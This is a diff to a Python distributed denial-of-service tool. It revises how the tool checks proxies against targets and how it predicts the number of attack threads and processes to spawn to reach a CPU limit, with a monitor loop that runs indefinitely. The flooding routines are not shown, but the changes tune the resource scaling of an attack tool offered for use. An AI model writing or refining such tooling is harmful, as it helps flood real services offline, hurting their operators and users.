@@ -60,7 +60,7 @@ def update_proxies(period: int, proxy_timeout: float, targets: list):
                 ProxyChecker.checkAll,
                 proxies=proxies[i::size],
                 timeout=proxy_timeout,
-                threads=((100*psutil.cpu_count()) // size),  # Use 1 thread per target for proxy checking
+                threads=((100*psutil.cpu_count()) // size),  # Roughly 100*CPU cores distributed per target
                 url=target.url
             )
             for i, target in enumerate(targets)
@@ -99,14 +99,16 @@ def predict_threads_for_cpu(cpu_limit, processes, targets):
     are running at any given time.
 
     This function:
-      - Measures the total CPU usage from all active processes.
-      - Computes the average CPU load per thread.
-      - Estimates how many new threads are needed based on the remaining CPU capacity.
-      - Ensures that a minimum of 1,000 threads are running.
+      - Warms up each process's CPU counter,
+      - Measures the total CPU usage from all active processes reliably,
+      - Computes the average CPU load per thread,
+      - Estimates how many new threads are needed based on the remaining CPU capacity,
+      - Accounts for multi-core environments (since system-wide usage is over all cores),
+      - Ensures a minimum addition if total threads fall below 1,000,
       - Guarantees at least one new thread per target if threads are added.
 
     Parameters:
-        cpu_limit (float): The target total CPU usage (e.g., 20.0 for 20%).
+        cpu_limit (float): The target overall CPU usage percentage (e.g., 20.0 for 20%).
         processes (list): List of tuples (process, thread_count) for all active processes.
         targets (list): List of targets (used to enforce a minimum of one thread per target).
 
@@ -116,35 +118,45 @@ def predict_threads_for_cpu(cpu_limit, processes, targets):
     total_cpu_usage = 0.0
     total_threads_running = 0
 
-    # Gather CPU usage and thread counts from all running processes.
+    # Warm up the CPU counters for all processes (set interval=None to initialize)
+    for proc, _ in processes:
+        try:
+            psutil.Process(proc.pid).cpu_percent(interval=None)
+        except psutil.NoSuchProcess:
+            continue
+
+    # Wait a short time to gather an accurate delta (this ensures our stats aren't "fake")
+    time.sleep(1)
+
+    # Now measure each process's CPU usage (non-blocking with interval=None)
     for proc, thread_count in processes:
         try:
-            proc_cpu = psutil.Process(proc.pid).cpu_percent(interval=1)
+            proc_cpu = psutil.Process(proc.pid).cpu_percent(interval=None)
         except psutil.NoSuchProcess:
             continue
         total_cpu_usage += proc_cpu
         total_threads_running += thread_count
 
-    print(f"[DEBUG] Current total CPU usage from processes: {total_cpu_usage:.2f}% using {total_threads_running} threads.")
+    # Get overall system CPU usage for context (this is averaged over all cores)
+    system_cpu = psutil.cpu_percent(interval=0.1)
+    print(f"[DEBUG] Overall system CPU usage: {system_cpu:.2f}%")
+    print(f"[DEBUG] Total CPU usage from our processes: {total_cpu_usage:.2f}% using {total_threads_running} threads.")
 
-    # Compute average CPU usage per thread.
+    # Compute average CPU usage per thread (avoid division by zero)
     if total_threads_running > 0:
         avg_cpu_per_thread = total_cpu_usage / total_threads_running
     else:
-        # Fallback: assume a minimal CPU usage per thread if nothing is running.
-        avg_cpu_per_thread = 0.1
+        avg_cpu_per_thread = 0.1  # Fallback if nothing is running
 
     print(f"[DEBUG] Average CPU usage per thread: {avg_cpu_per_thread:.4f}%")
 
-    # Baseline prediction:
+    # Baseline prediction: if no threads are running, use a baseline number
     if total_threads_running == 0 or avg_cpu_per_thread == 0:
-        # If there are no threads or our measurement is zero, start with a baseline.
-        # For example, if there are <=20 targets, spawn 20 threads per target; otherwise, spawn one per target.
         baseline = 20 * len(targets) if len(targets) <= 20 else len(targets)
         predicted_new_threads = baseline
         print(f"[DEBUG] No running threads or avg_cpu_per_thread is 0, using baseline: {predicted_new_threads}")
     else:
-        # Calculate remaining CPU capacity.
+        # Calculate remaining CPU capacity (note: if using multi-core, adjust if needed)
         cpu_diff = cpu_limit - total_cpu_usage
         if cpu_diff <= 0:
             predicted_new_threads = 0
@@ -235,7 +247,7 @@ def run_ddos(targets: list, period: int, rpc: int, udp_threads: int, http_method
     Initially spawn one process per target (or two for TCP targets), then let the CPU
     monitor dynamically add (or remove) processes until the CPU usage reaches the target.
     """
-    threads_per_target = 1  # Start minimally; additional threads will be spawned dynamically.
+    # Start minimally; additional threads will be spawned dynamically.
     params_list = []
     processes = []  # List of tuples: (process, thread_count)
 
@@ -266,7 +278,7 @@ def run_ddos(targets: list, period: int, rpc: int, udp_threads: int, http_method
     # Continuously monitor and adjust CPU usage by spawning/killing processes.
     monitor_cpu_usage(processes, cpu_limit, period, rpc, udp_threads, http_methods, debug, targets)
 
-    # Wait for all processes to finish (this line is rarely reached since monitor_cpu_usage is infinite)
+    # Wait for all processes to finish (rarely reached, since monitor_cpu_usage loops infinitely)
     for p, _ in processes:
         p.wait()
 
